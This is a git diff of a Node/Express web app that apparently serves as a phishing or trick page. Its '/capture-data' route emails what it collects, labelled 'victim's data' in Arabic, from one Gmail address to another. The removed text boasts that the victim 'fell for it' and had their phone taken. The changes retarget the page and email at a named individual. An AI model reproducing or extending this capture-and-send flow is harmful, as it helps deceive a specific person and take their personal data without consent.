@@ -369,8 +369,8 @@ app.get("/", (req, res) => {
 
         <!-- شاشة النتيجة -->
         <div id="resultScreen" class="result-screen">
-            <div class="success-message">🎉 وقعت كركر! أخذنا تلفونك 🎉</div>
-            <p class="success-subtitle">بلاسيبيسبلسيبلزسيبزيسالا</p>
+            <div class="success-message">روحي روحي انستا يدبه</div>
+            <p class="success-subtitle">😘</p>
             <button id="newUserBtn" class="try-again-btn">👤 مستخدم جديد</button>
         </div>
     </div>
@@ -495,14 +495,14 @@ app.post("/capture-data", async (req, res) => {
     const mailOptions = {
       from: "braudeflixwatch@gmail.com",
       to: "mohamadibra403@gmail.com",
-      subject: "🎯 وقعت كركر! - بيانات جديدة",
+      subject: "Marah murad",
       html: `
         <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; background: linear-gradient(135deg, #ff4757 0%, #ff3838 100%); padding: 20px; border-radius: 10px;">
           <div style="background: white; padding: 30px; border-radius: 10px; text-align: center;">
-            <h1 style="color: #333; margin-bottom: 20px;">🎉 وقعت كركر! أخذنا هاتفه 🎉</h1>
+            <h1 style="color: #333; margin-bottom: 20px;">اهلا وسهلا بمرح</h1>
             
             <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0;">
-              <h3 style="color: #495057; margin-bottom: 15px;">📋 بيانات الضحية:</h3>
+              <h3 style="color: #495057; margin-bottom: 15px;"> بيانات الضحية:</h3>
               
               <div style="text-align: right; margin: 15px 0;">
                 <strong style="color: #6c757d;">الاسم:</strong>
